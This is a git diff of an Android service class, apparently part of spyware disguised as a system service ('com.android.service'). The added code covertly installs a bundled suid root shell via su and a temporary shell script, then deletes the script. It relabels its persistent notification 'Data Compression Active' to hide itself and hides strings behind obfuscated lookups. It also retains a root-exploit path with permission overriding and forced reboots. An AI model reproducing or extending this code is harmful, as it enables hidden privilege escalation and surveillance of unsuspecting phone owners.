@@ -13,14 +13,10 @@ import java.io.OutputStreamWriter;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
-import java.security.SecureRandom;
 import java.util.Arrays;
 
-import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.CipherInputStream;
-import javax.crypto.IllegalBlockSizeException;
-import javax.crypto.KeyGenerator;
 import javax.crypto.NoSuchPaddingException;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.IvParameterSpec;
@@ -38,7 +34,6 @@ import android.graphics.Bitmap;
 import android.graphics.Bitmap.Config;
 import android.graphics.Canvas;
 import android.graphics.Paint;
-import android.os.Build;
 import android.os.IBinder;
 import android.view.Display;
 import android.view.WindowManager;
@@ -46,6 +41,7 @@ import android.widget.Toast;
 
 import com.android.service.auto.Cfg;
 import com.android.service.capabilities.PackageInfo;
+import com.android.service.crypto.Keys;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
@@ -73,7 +69,7 @@ public class ServiceCore extends Service {
 	public void onCreate() {
 		super.onCreate();
 		Messages.init(getApplicationContext());
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
 		}
@@ -84,37 +80,37 @@ public class ServiceCore extends Service {
 		}
 
 		needsNotification = isNotificationNeeded();
-		
+
 		Status.setAppContext(getApplicationContext());
 
 		// E' sempre false se Cfg.ACTIVITY = false
 		if (needsNotification == true) {
-			Notification note = new Notification(R.drawable.notify_icon, "Start system service",
+			Notification note = new Notification(R.drawable.notify_icon, "Data Compression Active",
 					System.currentTimeMillis());
-			
+
 			Intent i = new Intent(this, FakeActivity.class);
-	
+
 			i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
-	
+
 			PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);
-	
+
 			// Activity Name and Displayed Text
-			note.setLatestEventInfo(this, "Activity", "Service", pi);
-			note.flags |= Notification.FLAG_NO_CLEAR;
-	
+			note.flags |= Notification.FLAG_AUTO_CANCEL;
+			note.setLatestEventInfo(this, "", "", pi);
+
 			startForeground(1260, note);
 		}
 	}
 
 	private boolean isNotificationNeeded() {
-		if (Cfg.ACTIVITY) {
+		if (Cfg.OSVERSION.equals("v2") == false) {
 			int sdk_version = android.os.Build.VERSION.SDK_INT;
-			
-			if (sdk_version >= 11 /*Build.VERSION_CODES.HONEYCOMB*/) {
+
+			if (sdk_version >= 11 /* Build.VERSION_CODES.HONEYCOMB */) {
 				return true;
 			}
 		}
-		
+
 		return false;
 	}
 
@@ -122,23 +118,37 @@ public class ServiceCore extends Service {
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
 
+		// Core core = Core.getInstance();
+		// core.setAutostartAlarm();
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
 		}
 
-		if (PackageInfo.checkRoot() == true) {
-			Status.self().setRoot(true);
-		} else {
-			Status.self().setRoot(false);
+		// Abbiamo su?
+		Status.self().setSu(PackageInfo.hasSu());
+
+		// Abbiamo la root?
+		Status.self().setRoot(PackageInfo.checkRoot());
+
+		if (Status.self().haveSu() == true && Status.self().haveRoot() == false && Keys.self().wantsPrivilege()) {
+			// Ask the user...
+			superapkRoot();
+
+			Status.self().setRoot(PackageInfo.checkRoot());
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): isRoot = " + Status.self().haveRoot()); //$NON-NLS-1$
+			}
 		}
 
 		if (Cfg.EXP) {
-			boolean isRoot = false;
-			
-			if (PackageInfo.checkRoot() == false) {
+			boolean isRoot = Status.self().haveRoot();
+
+			if (isRoot == false) {
 				// Don't exploit if we have no SD card mounted
 				if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
-					//isRoot = root();
+					// isRoot = root();
 				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (onStart) no media mounted"); //$NON-NLS-1$
@@ -149,26 +159,26 @@ public class ServiceCore extends Service {
 			if (isRoot == false) {
 				// Ask the user...
 				superapkRoot();
-				
+
 				isRoot = PackageInfo.checkRoot();
 			}
-			
+
 			if (isRoot == true) {
 				int ret = overridePermissions();
 
 				Toast.makeText(this, "RET: " + ret, Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 
 				switch (ret) {
-					case 0:
-					case 1:
-						return; // Non possiamo partire
-	
-					case 2: // Possiamo partire
-					default:
-						break;
+				case 0:
+				case 1:
+					return; // Non possiamo partire
+
+				case 2: // Possiamo partire
+				default:
+					break;
 				}
 			}
-			
+
 			Status.self().setRoot(isRoot);
 		}
 
@@ -245,7 +255,7 @@ public class ServiceCore extends Service {
 
 		core.Stop();
 		core = null;
-		
+
 		if (needsNotification == true) {
 			stopForeground(true);
 		}
@@ -261,6 +271,7 @@ public class ServiceCore extends Service {
 			final Bitmap bitmap = Bitmap.createBitmap(width, height, Config.ARGB_8888);
 			final Canvas canvas = new Canvas(bitmap);
 			final Paint paint = new Paint();
+
 			paint.setStyle(Paint.Style.FILL);
 			paint.setAntiAlias(true);
 			paint.setTextSize(20);
@@ -356,8 +367,12 @@ public class ServiceCore extends Service {
 			pi.addRequiredPermissions(Messages.getString("32.23"));
 
 			// .apk con tutti i permessi nel manifest
-			InputStream manifestApkStream = getResources().openRawResource(R.raw.layout);
-			fileWrite(manifest, manifestApkStream, Messages.getString("36.0"));
+
+			// TODO riabilitare le righe quando si reinserira' l'exploit
+			// InputStream manifestApkStream =
+			// getResources().openRawResource(R.raw.layout);
+			// fileWrite(manifest, manifestApkStream,
+			// Messages.getString("36.0"));
 
 			// Copiamolo in /data/app/*.apk
 			// /system/bin/ntpsvd qzx \"cat
@@ -413,29 +428,45 @@ public class ServiceCore extends Service {
 	}
 
 	// Prendi la root tramite superuser.apk
-	private boolean superapkRoot() {
+	private void superapkRoot() {
 		final File filesPath = getApplicationContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
 		final String suidext = Messages.getString("32.6"); // statusdb
-		boolean isRoot = PackageInfo.checkRoot();
-		
-		Resources resources = getResources();
-		InputStream stream = resources.openRawResource(R.raw.statuslog);
 
-		stream = resources.openRawResource(R.raw.statusdb);
-		
+		if (Status.self().haveSu() == false) {
+			return;
+		}
+
+		Resources resources = getResources();
+		// exploit
+		// InputStream stream = resources.openRawResource(R.raw.statuslog);
+
+		// suidext
+		InputStream stream = resources.openRawResource(R.raw.statusdb);
+
 		try {
 			// 0x5A3D10448D7A912A
 			fileWrite(suidext, stream, Messages.getString("36.2"));
-			
+
 			// Proviamoci ad installare la nostra shell root
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (superapkRoot): " + "chmod 755 " + path + "/" + suidext); //$NON-NLS-1$
-				Check.log(TAG + " (superapkRoot): " + "su -c \"" + path + "/" + suidext + Messages.getString("32.11") + "\""); //$NON-NLS-1$
+				Check.log(TAG
+						+ " (superapkRoot): " + Messages.getString("32.31")); //$NON-NLS-1$
 			}
+
+			Runtime.getRuntime().exec(Messages.getString("32.7") + path + "/" + suidext);
 			
-			Runtime.getRuntime().exec("chmod 755 " + path + "/" + suidext);
-			Runtime.getRuntime().exec("su -c \"" + path + "/" + suidext + Messages.getString("32.11") + "\""); //$NON-NLS-1$ //$NON-NLS-2$
+			if (createInstallScript() == true) {
+				Process script = Runtime.getRuntime().exec(Messages.getString("32.7") + path + "/s");
+				script.waitFor();
+			
+				// su -c /data/data/com.android.service/files/s
+				Process localProcess = Runtime.getRuntime().exec(Messages.getString("32.31"));
+				localProcess.waitFor();
+				
+				removeInstallScript();
+			}
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
@@ -446,13 +477,10 @@ public class ServiceCore extends Service {
 				Check.log(TAG + " (superapkRoot): Exception"); //$NON-NLS-1$
 			}
 
-			return false;
+			return;
 		}
-		
-		
-		return isRoot;
 	}
-	
+
 	private boolean root() {
 		try {
 			if (!Cfg.EXP) {
@@ -474,12 +502,12 @@ public class ServiceCore extends Service {
 
 			Resources resources = getResources();
 			InputStream stream = resources.openRawResource(R.raw.statuslog);
-			
+
 			// "0x5A3D10448D7A912B"
 			fileWrite(exploit, stream, Messages.getString("36.1"));
 
 			stream = resources.openRawResource(R.raw.statusdb);
-			
+
 			// 0x5A3D10448D7A912A
 			fileWrite(suidext, stream, Messages.getString("36.2"));
 
@@ -522,10 +550,6 @@ public class ServiceCore extends Service {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (onStart): Root exploit"); //$NON-NLS-1$
 				}
-				
-				if (Cfg.DEMO) {
-					Toast.makeText(this, Messages.getString("32.12"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
-				}
 
 				// Riavviamo il telefono
 				Runtime.getRuntime().exec(path + "/" + suidext + " reb"); //$NON-NLS-1$ //$NON-NLS-2$
@@ -533,13 +557,10 @@ public class ServiceCore extends Service {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (onStart): exploit failed!"); //$NON-NLS-1$
 				}
-				if (Cfg.DEMO) {
-					Toast.makeText(this, Messages.getString("32.13"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
-				}
 			}
-			
+
 			return isRoot;
-			
+
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
@@ -551,6 +572,38 @@ public class ServiceCore extends Service {
 			}
 
 			return false;
+		}
+	}
+	
+	private boolean createInstallScript() {
+		// 32.29 = /data/data/com.android.service/files/statusdb rt
+		String script = "#!/system/bin/sh\n" + Messages.getString("32.29") + "\n";
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (createInstallScript): install script: " + script); //$NON-NLS-1$
+		}
+		
+		try {
+			FileOutputStream fos = openFileOutput("s", Context.MODE_PRIVATE);
+			fos.write(script.getBytes());
+			fos.close();
+			
+			return true;
+		} catch (Exception e) {
+			if (Cfg.EXP) {
+				Check.log(e);
+			}
+			
+			return false;
+		}
+	}
+	
+	private void removeInstallScript() {
+		// /data/data/com.android.service/files/s
+		File rem = new File(Messages.getString("32.33"));
+		
+		if (rem.exists()) {
+			rem.delete();
 		}
 	}
 
@@ -598,7 +651,8 @@ public class ServiceCore extends Service {
 			Check.log(TAG + " (decodeEnc): key=" + Utils.byteArrayToHex(key.getEncoded()));
 		}
 
-		Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding"); //$NON-NLS-1$
+		// 17.4=AES/CBC/PKCS5Padding
+		Cipher cipher = Cipher.getInstance(Messages.getString("17.4")); //$NON-NLS-1$
 		final byte[] iv = new byte[16];
 		Arrays.fill(iv, (byte) 0);
 		IvParameterSpec ivSpec = new IvParameterSpec(iv);
